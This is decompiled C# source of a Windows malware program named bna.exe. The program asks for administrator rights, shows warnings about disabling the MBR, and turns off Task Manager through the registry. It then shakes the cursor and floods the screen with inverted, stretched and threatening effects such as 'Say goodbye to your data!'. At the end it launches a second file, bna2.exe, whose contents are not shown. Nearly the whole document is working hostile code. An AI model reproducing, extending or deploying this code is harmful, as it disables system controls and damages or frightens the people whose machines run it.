/* 
Reversed by sigma
maybe obfuscated
*/
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

#nullable disable
internal class Program
{
  private const uint SRCCOPY = 13369376;
  private const uint NOTSRCCOPY = 3342344;

  [DllImport("user32.dll")]
  private static extern IntPtr GetDesktopWindow();

  [DllImport("user32.dll")]
  private static extern IntPtr GetDC(IntPtr hWnd);

  [DllImport("user32.dll")]
  private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

  [DllImport("gdi32.dll")]
  private static extern bool BitBlt(
    IntPtr hdcDest,
    int nXDest,
    int nYDest,
    int nWidth,
    int nHeight,
    IntPtr hdcSrc,
    int nXSrc,
    int nYSrc,
    uint dwRop);

  [DllImport("gdi32.dll")]
  private static extern int StretchBlt(
    IntPtr hdcDest,
    int xDest,
    int yDest,
    int wDest,
    int hDest,
    IntPtr hdcSrc,
    int xSrc,
    int ySrc,
    int wSrc,
    int hSrc,
    uint rop);

  [DllImport("gdi32.dll")]
  private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

  [DllImport("gdi32.dll")]
  private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

  [DllImport("gdi32.dll")]
  private static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);

  [DllImport("gdi32.dll")]
  private static extern bool DeleteDC(IntPtr hdc);

  [DllImport("gdi32.dll")]
  private static extern bool DeleteObject(IntPtr hObject);

  private static void Main()
  {
    if (!Program.IsAdministrator())
    {
      Program.RestartAsAdmin();
    }
    else
    {
      if (MessageBox.Show("This program harms your computer. Disable the MBR on this computer. Do you want to run it?", "bna.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No || MessageBox.Show("Final warning! Do you really want to do it? You will not be able to get your data back. And you won't be able to use your computer. Do you really want to do it yet? The author does not take any responsibility.", "bna.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No)
        return;
      Program.DisableTaskManager();
      Thread thread = new Thread(new ThreadStart(Program.ShakeCursor));
      thread.Start();
      Program.PlaySound();
      Program.StartEffects();
      thread.Abort();
    }
  }

  private static bool IsAdministrator()
  {
    try
    {
      return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch
    {
      return false;
    }
  }

  private static void RestartAsAdmin()
  {
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = Process.GetCurrentProcess().MainModule.FileName,
        UseShellExecute = true,
        Verb = "runas"
      });
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show("管理者権限での再実行中にエラーが発生しました: " + ex.Message);
    }
    Environment.Exit(0);
  }

  private static void DisableTaskManager()
  {
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true) ?? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
      registryKey.SetValue("DisableTaskMgr", (object) "1", RegistryValueKind.String);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show("タスクマネージャーの無効化中にエラーが発生しました: " + ex.Message);
    }
  }

  private static void ShakeCursor()
  {
    Random random = new Random();
    while (true)
    {
      Cursor.Position = new Point(Cursor.Position.X + random.Next(-10, 10), Cursor.Position.Y + random.Next(-10, 10));
      Thread.Sleep(50);
    }
  }

  private static void PlaySound()
  {
    string str = "start_sound.wav";
    if (!File.Exists(str))
    {
      int num = (int) MessageBox.Show("音声ファイルが見つかりません: " + str);
    }
    else
    {
      using (SoundPlayer soundPlayer = new SoundPlayer(str))
        soundPlayer.Play();
    }
  }

  private static void StartEffects()
  {
    IntPtr desktopWindow = Program.GetDesktopWindow();
    IntPtr dc = Program.GetDC(desktopWindow);
    IntPtr compatibleDc = Program.CreateCompatibleDC(dc);
    IntPtr compatibleBitmap = Program.CreateCompatibleBitmap(dc, 1920, 1080);
    IntPtr h = Program.SelectObject(compatibleDc, compatibleBitmap);
    Program.RECT rect = new Program.RECT()
    {
      Left = 0,
      Top = 0,
      Right = 1920,
      Bottom = 1080
    };
    Program.RotateScreenEffect(dc, compatibleDc, ref rect);
    Program.ShowIconsEffect(dc, compatibleDc, ref rect);
    Program.InvertColorsEffect(dc, ref rect);
    Program.BlurEffect(dc, compatibleDc, ref rect);
    Program.ShowScbEffect(dc, compatibleDc, ref rect);
    Program.FlickerEffect(dc, ref rect);
    Program.ShowFinalMessage(dc, compatibleDc, ref rect);
    Program.RunFile("bna2.exe");
    Program.SelectObject(compatibleDc, h);
    Program.DeleteObject(compatibleBitmap);
    Program.DeleteDC(compatibleDc);
    Program.ReleaseDC(desktopWindow, dc);
  }

  private static void RunFile(string filePath)
  {
    try
    {
      Process.Start(filePath);
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show("ファイルを実行中にエラーが発生しました: " + ex.Message);
    }
  }

  private static void RotateScreenEffect(IntPtr hdcDesktop, IntPtr hdcMem, ref Program.RECT rect)
  {
    for (int index = 0; index < 10; ++index)
    {
      Program.StretchBlt(hdcDesktop, rect.Right / 4, rect.Bottom / 4, rect.Right / 2, rect.Bottom / 2, hdcMem, 0, 0, rect.Right, rect.Bottom, 13369376U);
      Program.StretchBlt(hdcMem, 0, 0, rect.Right, rect.Bottom, hdcDesktop, 0, 0, rect.Right / 2, rect.Bottom / 2, 13369376U);
      Thread.Sleep(1000);
    }
  }

  private static void ShowIconsEffect(IntPtr hdcDesktop, IntPtr hdcMem, ref Program.RECT rect)
  {
    Icon[] iconArray = new Icon[3]
    {
      SystemIcons.Error,
      SystemIcons.Warning,
      SystemIcons.Information
    };
    Random random = new Random();
    for (int index = 0; index < 20; ++index)
    {
      using (Graphics graphics = Graphics.FromHdc(hdcDesktop))
      {
        int x = random.Next(rect.Left, rect.Right - 64);
        int y = random.Next(rect.Top, rect.Bottom - 64);
        Icon icon = iconArray[random.Next(iconArray.Length)];
        graphics.DrawIcon(icon, x, y);
      }
      Thread.Sleep(1000);
    }
  }

  private static void InvertColorsEffect(IntPtr hdcDesktop, ref Program.RECT rect)
  {
    for (int index = 0; index < 10; ++index)
    {
      Program.BitBlt(hdcDesktop, 0, 0, rect.Right, rect.Bottom, hdcDesktop, 0, 0, 3342344U);
      Thread.Sleep(1000);
    }
  }

  private static void BlurEffect(IntPtr hdcDesktop, IntPtr hdcMem, ref Program.RECT rect)
  {
    for (int index = 0; index < 20; ++index)
    {
      Program.StretchBlt(hdcDesktop, rect.Right / 4, rect.Bottom / 4, rect.Right / 2, rect.Bottom / 2, hdcMem, 0, 0, rect.Right, rect.Bottom, 13369376U);
      Program.StretchBlt(hdcMem, 0, 0, rect.Right, rect.Bottom, hdcDesktop, 0, 0, rect.Right / 2, rect.Bottom / 2, 13369376U);
      Thread.Sleep(1000);
    }
  }

  private static void ShowScbEffect(IntPtr hdcDesktop, IntPtr hdcMem, ref Program.RECT rect)
  {
    string[] strArray = new string[3]
    {
      "bna.exe",
      "Your computer is now under control",
      "Say goodbye to your data!"
    };
    Random random = new Random();
    for (int index = 0; index < 30; ++index)
    {
      using (Graphics graphics = Graphics.FromHdc(hdcDesktop))
      {
        int x = random.Next(rect.Left, rect.Right - 200);
        int y = random.Next(rect.Top, rect.Bottom - 50);
        graphics.DrawString(strArray[random.Next(strArray.Length)], new Font("Arial", 20f, FontStyle.Bold), Brushes.Red, (float) x, (float) y);
      }
      Thread.Sleep(1000);
    }
  }

  private static void FlickerEffect(IntPtr hdcDesktop, ref Program.RECT rect)
  {
    for (int index = 0; index < 10; ++index)
    {
      Program.BitBlt(hdcDesktop, 0, 0, rect.Right, rect.Bottom, hdcDesktop, 0, 0, 3342344U);
      Thread.Sleep(500);
      Program.BitBlt(hdcDesktop, 0, 0, rect.Right, rect.Bottom, hdcDesktop, 0, 0, 3342344U);
      Thread.Sleep(500);
    }
  }

  private static void ShowFinalMessage(IntPtr hdcDesktop, IntPtr hdcMem, ref Program.RECT rect)
  {
    using (Graphics graphics = Graphics.FromHdc(hdcDesktop))
    {
      string s = "What will happen to your computer next?";
      Random random = new Random();
      for (int index = 0; index < 30; ++index)
      {
        int x = random.Next(rect.Left, rect.Right - 300);
        int y = random.Next(rect.Top, rect.Bottom - 50);
        graphics.DrawString(s, new Font("Arial", 20f, FontStyle.Bold), Brushes.Blue, (float) x, (float) y);
        Thread.Sleep(1000);
      }
    }
  }

  public struct RECT
  {
    public int Left;
    public int Top;
    public int Right;
    public int Bottom;
  }
}
